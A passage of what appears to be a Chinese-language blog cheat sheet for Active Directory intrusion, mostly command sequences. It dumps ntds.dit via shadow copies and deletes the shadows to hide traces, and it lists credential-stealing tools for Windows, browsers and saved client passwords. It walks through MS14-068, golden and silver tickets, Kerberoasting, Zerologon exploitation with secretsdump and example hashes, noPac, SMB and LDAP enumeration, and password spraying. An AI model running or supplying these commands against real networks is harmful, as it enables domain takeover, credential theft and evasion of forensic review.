class="line">利用卷影副本卷名拷贝ntds.dit文件与用注册表导出system.hive </span><br><span class="line"></span><br><span class="line">copy \\?\GLOBALLROOT\Device\xxxxxxxxxx\windows\ntds\ntds.dit C:\ntds.dit reg sava hklm\system system.hive </span><br><span class="line">&#x2F;&#x2F;导出system.hive文件到注册表 </span><br><span class="line"></span><br><span class="line">vssadmin delete shadows &#x2F;for&#x3D;C: &#x2F;quiet   &#x2F;&#x2F;删除卷影，隐藏痕迹</span><br></pre></td></tr></table></figure><p><a href="https://0range-x.github.io/2021/11/22/CVE-2020-1472/"><a href="https://0range-x.github.io/2021/11/22/CVE-2020-1472/#vssadmin%E5%8D%B7%E5%BD%B1%E6%8B%B7%E8%B4%9D">CVE-2020-1472的分析与复现 (0range-x.github.io)</a></a></p><h3 id="dpapi解密"><a href="#dpapi解密" class="headerlink" title="dpapi解密"></a>dpapi解密</h3><h1 id="2-内网信息收集"><a href="#2-内网信息收集" class="headerlink" title="2.内网信息收集"></a>2.内网信息收集</h1><h2 id="本机信息收集"><a href="#本机信息收集" class="headerlink" title="本机信息收集"></a>本机信息收集</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">1、用户列表  net user &#x2F;domain</span><br><span class="line">windows用户列表 分析邮件用户，内网[域]邮件用户，通常就是内网[域]用户</span><br><span class="line"></span><br><span class="line">2.进程列表  tasklist &#x2F;svc</span><br><span class="line">分析杀毒软件&#x2F;安全监控工具等 邮件客户端 VPN ftp等</span><br><span class="line"></span><br><span class="line">3.服务列表tasklist &#x2F;svc</span><br><span class="line">与安全防范工具有关服务[判断是否可以手动开关等] 存在问题的服务[权限&#x2F;漏洞]</span><br><span class="line"></span><br><span class="line">4.端口列表netstat -ano</span><br><span class="line">开放端口对应的常见服务&#x2F;应用程序[匿名&#x2F;权限&#x2F;漏洞等] 利用端口进行信息收集</span><br><span class="line"></span><br><span class="line">5.补丁列表systeminfo</span><br><span class="line">分析 Windows 补丁 第三方软件[Java&#x2F;Oracle&#x2F;Flash 等]漏洞</span><br><span class="line"></span><br><span class="line">6.本机共享smbclient -L ip  </span><br><span class="line">   net user \\ip\c$</span><br><span class="line">本机共享列表&#x2F;访问权限 本机访问的域共享&#x2F;访问权限</span><br><span class="line"></span><br><span class="line">7.本用户习惯分析</span><br><span class="line">历史记录 收藏夹 文档等</span><br></pre></td></tr></table></figure><h3 id="8-获取当前用户密码"><a href="#8-获取当前用户密码" class="headerlink" title="8.获取当前用户密码"></a>8.获取当前用户密码</h3><h4 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h4><ul><li><a href="https://github.com/gentilkiwi/mimikatz">mimikatz</a></li><li><a href="https://github.com/peewpw/Invoke-WCMDump">Invoke-WCMDump</a></li><li><a href="https://github.com/giMini/mimiDbg">mimiDbg</a></li><li><a href="https://github.com/AlessandroZ/LaZagne">LaZagne</a></li><li><a href="http://launcher.nirsoft.net/downloads/">NirLauncher )</a></li><li><a href="https://github.com/quarkslab/quarkspwdump">quarkspwdump</a></li></ul><h4 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h4><ul><li><a href="https://github.com/huntergregal/mimipenguin">mimipenguin</a></li><li><a href="https://github.com/AlessandroZ/LaZagne">LaZagne</a></li></ul><h4 id="浏览器"><a href="#浏览器" class="headerlink" title="浏览器"></a>浏览器</h4><ul><li><a href="https://github.com/moonD4rk/HackBrowserData">HackBrowserData</a></li><li><a href="https://github.com/djhohnstein/SharpWeb">SharpWeb</a></li><li><a href="https://github.com/GhostPack/SharpDPAPI">SharpDPAPI</a></li><li><a href="https://github.com/hayasec/360SafeBrowsergetpass">360SafeBrowsergetpass</a></li><li><a href="https://github.com/QAX-A-Team/BrowserGhost/">BrowserGhost</a></li><li><a href="https://github.com/DeEpinGh0st/Browser-cookie-steal">Browser-cookie-steal(窃取浏览器cookie)</a></li></ul><h4 id="Navicat密码"><a href="#Navicat密码" class="headerlink" title="Navicat密码"></a>Navicat密码</h4><p>版本：Navicat 11或12</p><p>方法：<a href="https://blog.csdn.net/CCESARE/article/details/104746596">https://blog.csdn.net/CCESARE/article/details/104746596</a></p><p>解密脚本：<a href="https://github.com/tianhe1986/FatSmallTools">https://github.com/tianhe1986/FatSmallTools</a></p><p><a href="https://github.com/HyperSine/how-does-navicat-encrypt-password">https://github.com/HyperSine/how-does-navicat-encrypt-password</a></p><h4 id="xshell-amp-xftp密码"><a href="#xshell-amp-xftp密码" class="headerlink" title="xshell&amp;xftp密码"></a>xshell&amp;xftp密码</h4><p><a href="https://github.com/dzxs/Xdecrypt">https://github.com/dzxs/Xdecrypt</a></p><h4 id="mRemoteNG密码"><a href="#mRemoteNG密码" class="headerlink" title="mRemoteNG密码"></a>mRemoteNG密码</h4><p><a href="https://github.com/kmahyyg/mremoteng-decrypt">https://github.com/kmahyyg/mremoteng-decrypt</a></p><p><a href="https://github.com/haseebT/mRemoteNG-Decrypt">https://github.com/haseebT/mRemoteNG-Decrypt</a></p><h2 id="扩散信息收集"><a href="#扩散信息收集" class="headerlink" title="扩散信息收集"></a>扩散信息收集</h2><h3 id="常用端口扫描工具"><a href="#常用端口扫描工具" class="headerlink" title="常用端口扫描工具"></a>常用端口扫描工具</h3><ul><li>nmap</li><li>masscan</li><li>zmap</li><li>s扫描器</li><li>自写脚本</li><li>nc</li></ul><h3 id="内网拓扑架构分析"><a href="#内网拓扑架构分析" class="headerlink" title="内网拓扑架构分析"></a>内网拓扑架构分析</h3><ul><li>DMZ</li><li>管理网</li><li>生产网</li><li>测试网</li></ul><h3 id="常见信息收集命令"><a href="#常见信息收集命令" class="headerlink" title="常见信息收集命令"></a>常见信息收集命令</h3><p>ipconfig</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ipconfig &#x2F;all ------&gt; 查询本机 IP 段，所在域等</span><br></pre></td></tr></table></figure><p>net</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">net user ------&gt; 本机用户列表</span><br><span class="line">net localgroup administrators ------&gt; 本机管理员[通常含有域用户]</span><br><span class="line">net user &#x2F;domain ------&gt; 查询域用户</span><br><span class="line">net group &#x2F;domain ------&gt; 查询域里面的工作组</span><br><span class="line">net group &quot;domain admins&quot; &#x2F;domain ------&gt; 查询域管理员用户组</span><br><span class="line">net localgroup administrators &#x2F;domain ------&gt; 登录本机的域管理员</span><br><span class="line">net localgroup administrators workgroup\user001 &#x2F;add -----&gt;域用户添加到本机 net group &quot;Domain controllers&quot; -------&gt; 查看域控制器(如果有多台)</span><br><span class="line">net view ------&gt; 查询同一域内机器列表 net view &#x2F;domain ------&gt; 查询域列表</span><br><span class="line">net view &#x2F;domain:domainname</span><br></pre></td></tr></table></figure><p>dsquery</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">dsquery computer domainroot -limit 65535 &amp;&amp; net group &quot;domain</span><br><span class="line">computers&quot; &#x2F;domain ------&gt; 列出该域内所有机器名</span><br><span class="line">dsquery user domainroot -limit 65535 &amp;&amp; net user &#x2F;domain------&gt;列出该域内所有用户名</span><br><span class="line">dsquery subnet ------&gt;列出该域内网段划分</span><br><span class="line">dsquery group &amp;&amp; net group &#x2F;domain ------&gt;列出该域内分组 </span><br><span class="line">dsquery ou ------&gt;列出该域内组织单位 </span><br><span class="line">dsquery server &amp;&amp; net time &#x2F;domain------&gt;列出该域内域控制器 </span><br></pre></td></tr></table></figure><h3 id="第三方信息收集"><a href="#第三方信息收集" class="headerlink" title="第三方信息收集"></a>第三方信息收集</h3><ul><li>NETBIOS 信息收集</li><li>SMB 信息收集</li><li>空会话信息收集</li><li>漏洞信息收集等</li></ul><h1 id="3-获取域控的方法"><a href="#3-获取域控的方法" class="headerlink" title="3.获取域控的方法"></a>3.获取域控的方法</h1><h5 id="SYSVOL"><a href="#SYSVOL" class="headerlink" title="SYSVOL"></a>SYSVOL</h5><p>SYSVOL是指存储域公共文件服务器副本的共享文件夹，它们在域中所有的域控制器之间复制。 Sysvol文件夹是安装AD时创建的，它用来存放GPO、Script等信息。同时，存放在Sysvol文件夹中的信息，会复制到域中所有DC上。 相关阅读:</p><ul><li><a href="http://www.freebuf.com/vuls/92016.html">寻找SYSVOL里的密码和攻击GPP（组策略偏好）</a></li><li><a href="http://blog.51cto.com/ycrsjxy/203095">Windows Server 2008 R2之四管理Sysvol文件夹</a></li><li><a href="https://adsecurity.org/?p=2288">SYSVOL中查找密码并利用组策略首选项</a></li><li><a href="https://xz.aliyun.com/t/1653">利用SYSVOL还原组策略中保存的密码</a></li></ul><h5 id="MS14-068-Kerberos"><a href="#MS14-068-Kerberos" class="headerlink" title="MS14-068 Kerberos"></a>MS14-068 Kerberos</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python ms14-068.py -u 域用户@域名 -p 密码 -s 用户SID -d 域主机</span><br></pre></td></tr></table></figure><p>利用mimikatz将工具得到的<a href="mailto:TGT_domainuser@SERVER.COM.ccache">TGT_domainuser@SERVER.COM.ccache</a>写入内存，创建缓存证书：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;kerberos::ptc c:TGT_darthsidious@pentest.com.ccache&quot; exit</span><br><span class="line">net use k: \pentest.comc$</span><br></pre></td></tr></table></figure><p>相关阅读 :</p><ul><li><a href="http://adsecurity.org/?p=676">Kerberos的工具包PyKEK</a></li><li><a href="http://www.freebuf.com/vuls/56081.html">深入解读MS14-068漏洞</a></li><li><a href="https://adsecurity.org/?p=541">Kerberos的安全漏洞</a></li></ul><h5 id="SPN扫描"><a href="#SPN扫描" class="headerlink" title="SPN扫描"></a>SPN扫描</h5><p>Kerberoast可以作为一个有效的方法从Active Directory中以普通用户的身份提取服务帐户凭据，无需向目标系统发送任何数据包。 SPN是服务在使用Kerberos身份验证的网络上的唯一标识符。它由服务类，主机名和端口组成。在使用Kerberos身份验证的网络中，必须在内置计算机帐户（如NetworkService或LocalSystem）或用户帐户下为服务器注册SPN。对于内部帐户，SPN将自动进行注册。但是，如果在域用户帐户下运行服务，则必须为要使用的帐户的手动注册SPN。 SPN扫描的主要好处是，SPN扫描不需要连接到网络上的每个IP来检查服务端口，SPN通过LDAP查询向域控执行服务发现，SPN查询是Kerberos的票据行为一部分，因此比较难检测SPN扫描。 相关阅读 :</p><ul><li><a href="https://blog.netspi.com/locate-and-attack-domain-sql-servers-without-scanning/">非扫描式的SQL Server发现</a></li><li><a href="https://adsecurity.org/?p=1508">SPN扫描</a></li><li><a href="https://github.com/PyroTek3/PowerShell-AD-Recon">扫描SQLServer的脚本</a></li></ul><h5 id="Kerberos的黄金门票"><a href="#Kerberos的黄金门票" class="headerlink" title="Kerberos的黄金门票"></a>Kerberos的黄金门票</h5><p>在域上抓取的哈希</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">lsadump::dcsync &#x2F;domain:pentest.com &#x2F;user:krbtgt</span><br><span class="line"></span><br><span class="line">kerberos::purge</span><br><span class="line"></span><br><span class="line">kerberos::golden &#x2F;admin:administrator &#x2F;domain:域 &#x2F;sid:SID &#x2F;krbtgt:hash值 </span><br><span class="line">&#x2F;ticket:adinistrator.kiribi</span><br><span class="line"></span><br><span class="line">kerberos::ptt administrator.kiribi</span><br><span class="line"></span><br><span class="line">kerberos::tgt</span><br><span class="line"></span><br><span class="line">net use k: \pnet use k: \pentest.comc$</span><br></pre></td></tr></table></figure><p>相关阅读 :</p><ul><li><a href="https://adsecurity.org/?p=1640">https://adsecurity.org/?p=1640</a></li><li><a href="http://bobao.360.cn/learning/detail/3564.html">域服务账号破解实践</a></li><li><a href="https://blog.csdn.net/wulantian/article/details/42418231">Kerberos的认证原理</a></li><li><a href="https://klionsec.github.io/2016/08/10/ntlm-kerberos/">深刻理解windows安全认证机制ntlm＆Kerberos</a></li></ul><h5 id="Kerberos的银票务"><a href="#Kerberos的银票务" class="headerlink" title="Kerberos的银票务"></a>Kerberos的银票务</h5><p>黄金票据和白银票据的一些区别： Golden Ticket：伪造<code>TGT</code>，可以获取<code>任何Kerberos</code>服务权限 银票：伪造TGS，<code>只能访问指定的服务</code> 加密方式不同： Golden Ticket由<code>krbtgt</code>的hash加密 Silver Ticket由<code>服务账号</code>（通常为计算机账户）Hash加密 认证流程不同： 金票在使用的过程需要同域控通信 银票在使用的过程不需要同域控通信 相关阅读 :</p><ul><li><a href="https://adsecurity.org/?p=2011">攻击者如何使用Kerberos的银票来利用系统</a></li><li>[域渗透——Pass The Ticket](<a href="https://www.feiworks.com/wy/drops/%E5%9F%9F%E6%B8%97%E9%80%8F%E2%80%94%E2%80%94Pass">https://www.feiworks.com/wy/drops/域渗透——Pass</a> The Ticket.pdf)</li></ul><h5 id="域服务账号破解"><a href="#域服务账号破解" class="headerlink" title="域服务账号破解"></a>域服务账号破解</h5><p>与上面SPN扫描类似的原理 <a href="https://github.com/nidem/kerberoast">https://github.com/nidem/kerberoast</a> 获取所有用作SPN的帐户</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setspn -T PENTEST.com -Q *&#x2F;*</span><br></pre></td></tr></table></figure><p>从Mimikatz的RAM中提取获得的门票</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::list &#x2F;export</span><br></pre></td></tr></table></figure><p>用rgsrepcrack破解</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tgsrepcrack.py wordlist.txt 1-MSSQLSvc~sql01.medin.local~1433-MYDOMAIN.LOCAL.kirbi</span><br></pre></td></tr></table></figure><h5 id="凭证盗窃"><a href="#凭证盗窃" class="headerlink" title="凭证盗窃"></a>凭证盗窃</h5><p>从搜集的密码里面找管理员的密码</p><h5 id="NTLM-relay"><a href="#NTLM-relay" class="headerlink" title="NTLM relay"></a>NTLM relay</h5><ul><li><a href="https://dirkjanm.io/abusing-exchange-one-api-call-away-from-domain-admin/">One API call away from Domain Admin</a></li><li><a href="https://github.com/dirkjanm/privexchange/">privexchange</a></li><li><a href="https://github.com/ridter/exchange2domain">Exchange2domain</a></li></ul><p>用于主动让目标机器发起NTLM请求的方法：</p><ul><li><a href="https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py">printerbug</a></li><li><a href="https://github.com/topotam/PetitPotam">PetitPotam</a></li></ul><p>Relay LDAP:</p><ul><li><a href="https://github.com/Ridter/CVE-2019-1040-dcpwn">CVE-2019-1040-dcpwn</a></li></ul><p>Relay AD CS/PKI:</p><ul><li><a href="https://www.bussink.net/ad-cs-exploit-via-petitpotam-from-0-to-domain-domain/">AD CS/PKI template exploit</a></li></ul><p>集成几个利用的工具：</p><ul><li><a href="https://github.com/Ridter/Relayx">Relayx</a></li></ul><p>内网445端口转发：</p><ul><li><a href="https://github.com/praetorian-inc/PortBender">PortBender</a></li></ul><h5 id="Kerberos委派"><a href="#Kerberos委派" class="headerlink" title="Kerberos委派"></a>Kerberos委派</h5><ul><li><a href="https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html">Wagging-the-Dog.html</a></li><li><a href="https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/">s4u2pwnage</a></li><li><a href="https://xz.aliyun.com/t/2931">Attacking Kerberos Delegation</a></li><li><a href="https://adsecurity.org/?p=4056">用打印服务获取域控</a></li><li><a href="https://www.harmj0y.net/blog/activedirectory/a-case-study-in-wagging-the-dog-computer-takeover/">Computer Takeover</a></li><li><a href="https://dirkjanm.io/worst-of-both-worlds-ntlm-relaying-and-kerberos-delegation/">Combining NTLM Relaying and Kerberos delegation</a></li><li><a href="https://dirkjanm.io/exploiting-CVE-2019-1040-relay-vulnerabilities-for-rce-and-domain-admin/">CVE-2019-1040</a></li></ul><h5 id="地址解析协议"><a href="#地址解析协议" class="headerlink" title="地址解析协议"></a>地址解析协议</h5><p>实在搞不定再搞ARP</p><h5 id="zerologon漏洞"><a href="#zerologon漏洞" class="headerlink" title="zerologon漏洞"></a>zerologon漏洞</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">python3 cve-2020-1472-exploit.py &lt;MACHINE_BIOS_NAME&gt; &lt;ip&gt;</span><br><span class="line"></span><br><span class="line">secretsdump.py &lt;DOMAIN&gt;&#x2F;&lt;MACHINE_BIOS_NAME&gt;\$@&lt;IP&gt; -no-pass -just-dc-user &quot;Administrator&quot; </span><br><span class="line"></span><br><span class="line">secretsdump.py -hashes :&lt;HASH_admin&gt; &lt;DOMAIN&gt;&#x2F;Administrator@&lt;IP&gt;</span><br><span class="line"></span><br><span class="line">python3 restorepassword.py -target-ip &lt;IP&gt; &lt;DOMAIN&gt;&#x2F;&lt;MACHINE_BIOS_NAME&gt;@&lt;MACHINE_BIOS_NAME&gt; -hexpass &lt;HEXPASS&gt;</span><br></pre></td></tr></table></figure><p><a href="https://0range-x.github.io/2021/11/22/CVE-2020-1472/">CVE-2020-1472的分析与复现 (0range-x.github.io)</a></p><p>**1、利用Mimikatz **check</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsadump::zerologon &#x2F;target:dc1.exploit.local &#x2F;account:dc1$</span><br></pre></td></tr></table></figure><p><strong>exploit</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsadump::zerologon &#x2F;target:dc1.exploit.local &#x2F;account:dc1$ &#x2F;exploit</span><br></pre></td></tr></table></figure><p><strong>dcsync</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsadump::dcsync &#x2F;dc:dc1.exploit.local &#x2F;authuser:dc1$ &#x2F;authdomain:exploit.local &#x2F;authpassword:&quot;&quot; &#x2F;domain:exploit.local &#x2F;authntlm &#x2F;user:krbtgt</span><br></pre></td></tr></table></figure><p><strong>restore</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsadump::postzerologon &#x2F;target:conttosson.locl &#x2F;account:dc$ </span><br></pre></td></tr></table></figure><p><strong>2、利用impacket：</strong></p><ul><li>取目标主机名+IP</li><li>install 修改版本的impacket</li><li>Exp</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python cve-2020-1472-exploit.py DC2008 10.211.55.200</span><br></pre></td></tr></table></figure><p><a href="https://camo.githubusercontent.com/ab6ebf37bf1f547e4dd044b0ffb16f8493190a988f350bc7119c5c335b7c95be/68747470733a2f2f626c6f67706963732d313235313639313238302e66696c652e6d7971636c6f75642e636f6d2f696d67732f32303230303931363139303133372e706e67"><img src="https://camo.githubusercontent.com/ab6ebf37bf1f547e4dd044b0ffb16f8493190a988f350bc7119c5c335b7c95be/68747470733a2f2f626c6f67706963732d313235313639313238302e66696c652e6d7971636c6f75642e636f6d2f696d67732f32303230303931363139303133372e706e67" alt="img"></a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">secretsdump.py -no-<span class="keyword">pass</span> cgdomain.com/<span class="string">&#x27;DC2008$&#x27;</span>@<span class="number">10.211</span><span class="number">.55</span><span class="number">.200</span> -history -just-dc-user administrator</span><br><span class="line">secretsdump.py -no-<span class="keyword">pass</span> cgdomain.com/administrator@<span class="number">10.211</span><span class="number">.55</span><span class="number">.200</span> -hashes aad3b435b51404eeaad3b435b51404ee:3add1560657a19b3166247eb3eb149ae</span><br></pre></td></tr></table></figure><p><a href="https://camo.githubusercontent.com/d94bd9f15fb2db6a2b99b7463de0674117fb227d731c7d0d8526ee66bb66961d/68747470733a2f2f626c6f67706963732d313235313639313238302e66696c652e6d7971636c6f75642e636f6d2f696d67732f32303230303931363139303335392e706e67"><img src="https://camo.githubusercontent.com/d94bd9f15fb2db6a2b99b7463de0674117fb227d731c7d0d8526ee66bb66961d/68747470733a2f2f626c6f67706963732d313235313639313238302e66696c652e6d7971636c6f75642e636f6d2f696d67732f32303230303931363139303335392e706e67" alt="img"></a></p><p>获取到旧的密码明文hex，还原</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python restorepassword.py cgdomain.com&#x2F;DC2008@DC2008 -target-ip 10.211.55.200 -hexpass 59958639cbdd4523de5d42b01adb0e256e0d39aef14c8eef31f4c078862109f253bbb7b3817ab123d013856c028fa4993f5f5b9a830a3a98d87483b29df3fb55082a1f464b19220a2c04f6605d2d321a04afbb551f8f19a13d399f9f5af2aa23c5b76b49001033516fefd90cb0348256e8282b22cbf9e70d82a8b8d2916d578246e288af3af727533d36ad8950fe1c513771377d98a947c4a8eae2b581a74b6687a2e533b7e89e8d03c2e6c2123d519489869a6e33d3a8884be33107060b62e2852502261f48c097ddb68750cc55b7688cc951441cf02989a307f55c008e978edbaf31766d17b53505016c7580cb480b</span><br></pre></td></tr></table></figure><p><a href="https://camo.githubusercontent.com/206012e6d64974e4fda0704c8f1334e777a44f37f7b517e7d8776fbb79921e3f/68747470733a2f2f626c6f67706963732d313235313639313238302e66696c652e6d7971636c6f75642e636f6d2f696d67732f32303230303931363139303435372e706e67"><img src="https://camo.githubusercontent.com/206012e6d64974e4fda0704c8f1334e777a44f37f7b517e7d8776fbb79921e3f/68747470733a2f2f626c6f67706963732d313235313639313238302e66696c652e6d7971636c6f75642e636f6d2f696d67732f32303230303931363139303435372e706e67" alt="img"></a></p><p>恢复方法2</p><p> 通过wmic, pass the hash 拿到域控制器中的本地管理员权限(域管)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:8adfc85c3490040e942ae1e6c68f645e test.local&#x2F;Administrator@10.211.55.38</span><br></pre></td></tr></table></figure><p>然后分别执行,拷贝本机中SAM数据库到本地</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">- reg save HKLM\SYSTEM system.save</span><br><span class="line">- reg save HKLM\SAM sam.save</span><br><span class="line">- reg save HKLM\SECURITY security.save</span><br><span class="line">- get system.save</span><br><span class="line">- get sam.save</span><br><span class="line">- get security.save</span><br><span class="line">- del &#x2F;f system.save</span><br><span class="line">- del &#x2F;f sam.save</span><br><span class="line">- del &#x2F;f security.save</span><br></pre></td></tr></table></figure><p>提取明文hash</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">secretsdump.py -sam sam.save -system system.save -security security.save LOCAL</span><br></pre></td></tr></table></figure><p>然后恢复。</p><h5 id="CVE-2021-42278-amp-amp-CVE-2021-42287"><a href="#CVE-2021-42278-amp-amp-CVE-2021-42287" class="headerlink" title="CVE-2021-42278 &amp;&amp; CVE-2021-42287"></a>CVE-2021-42278 &amp;&amp; CVE-2021-42287</h5><p><a href="https://github.com/WazeHell/sam-the-admin">sam-the-admin</a></p><p><a href="https://github.com/cube0x0/noPac">noPac: CVE-2021-42287/CVE-2021-42278</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;noPac.exe -domain dc.com -user username -pass &#39;password&#39; &#x2F;dc owa.dc.com</span><br><span class="line">&#x2F;mAccount mAusername &#x2F;mPassword password &#x2F;service cifs &#x2F;ptt</span><br></pre></td></tr></table></figure><h1 id="4-列出可匿名访问的SMB共享"><a href="#4-列出可匿名访问的SMB共享" class="headerlink" title="4.列出可匿名访问的SMB共享"></a>4.列出可匿名访问的SMB共享</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">enum4linux -a -u &quot;&quot; -p &quot;&quot; &lt;dc-ip&gt; &amp;&amp; enum4linux -a -u &quot;guest&quot; -p &quot;&quot; &lt;dc-ip&gt;</span><br><span class="line"></span><br><span class="line">smbmap -u &quot;&quot; -p &quot;&quot; -P 445 -H &lt;dc-ip&gt; &amp;&amp; smbmap -u &quot;guest&quot; -p &quot;&quot; -P 445 -H &lt;dc-ip&gt;</span><br><span class="line"></span><br><span class="line">smbclient -U &#39;%&#39; -L &#x2F;&#x2F;&lt;dc-ip&gt; &amp;&amp; smbclient -U &#39;guest%&#39; -L &#x2F;&#x2F;&lt;dc-ip&gt;</span><br><span class="line"></span><br><span class="line">cme smb &lt;ip&gt; -u &#39;&#39; -p &#39;&#39; # 枚举可空Session访问的SMB共享</span><br><span class="line"></span><br><span class="line">cme smb &lt;ip&gt; -u &#39;a&#39; -p &#39;&#39; #枚举可匿名访问的SMB共享</span><br></pre></td></tr></table></figure><h1 id="5-枚举LDAP"><a href="#5-枚举LDAP" class="headerlink" title="5.枚举LDAP"></a>5.枚举LDAP</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nmap -n -sV --script &quot;ldap* and not brute&quot; -p 389 &lt;dc-ip&gt;</span><br><span class="line"></span><br><span class="line">ldapsearch -x -h &lt;ip&gt; -s base  </span><br></pre></td></tr></table></figure><h1 id="6-查找用户名"><a href="#6-查找用户名" class="headerlink" title="6.查找用户名"></a>6.查找用户名</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">enum4linux -U &lt;dc-ip&gt; | grep &#39;user:&#39;</span><br><span class="line"></span><br><span class="line">crackmapexec smb &lt;ip&gt; -u &lt;user&gt; -p &#39;&lt;password&gt;&#39; --users </span><br><span class="line"></span><br><span class="line">nmap -p 88 --script&#x3D;krb5-enum-users --script-args&#x3D;&quot;krb5-enum-users.realm&#x3D;&#39;&lt;domain&gt;&#39;,userdb&#x3D;&lt;users_list_file&gt;&quot; &lt;ip&gt; </span><br><span class="line"></span><br><span class="line">OSINT - 在互联网上寻找用户名</span><br></pre></td></tr></table></figure><h2 id="得到账号，但是没有密码"><a href="#得到账号，但是没有密码" class="headerlink" title="得到账号，但是没有密码"></a>得到账号，但是没有密码</h2><h3 id="密码喷洒"><a href="#密码喷洒" class="headerlink" title="密码喷洒"></a>密码喷洒</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">获取域密码策略 ：</span><br><span class="line">crackmapexec &lt;IP&gt; -u &#39;user&#39; -p &#39;password&#39; --pass-pol</span><br><span class="line">enum4linx -u &#39;username&#39; -p &#39;password&#39; -P &lt;IP&gt;</span><br><span class="line"></span><br><span class="line">cme smb &lt;dc-ip&gt; -u user.txt -p password.txt --no-bruteforce # 不爆破，只测试单一的 user&#x3D;password</span><br><span class="line"></span><br><span class="line">cme smb &lt;dc-ip&gt; -u user.txt -p password.txt # 交叉爆破，根据密码策略，失败过多可能会被封禁</span><br></pre></td></tr></table></figure><h3 id="ASREP-Roasting攻击"><a href="#ASREP-Roasting攻击" class="headerlink" title="ASREP-Roasting攻击"></a>ASREP-Roasting攻击</h3><h4 id="获取hash"><a href="#获取hash" class="headerlink" title="获取hash"></a>获取hash</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python GetNPUsers.py &lt;domain&gt;&#x2F; -usersfile &lt;usernames.txt&gt; 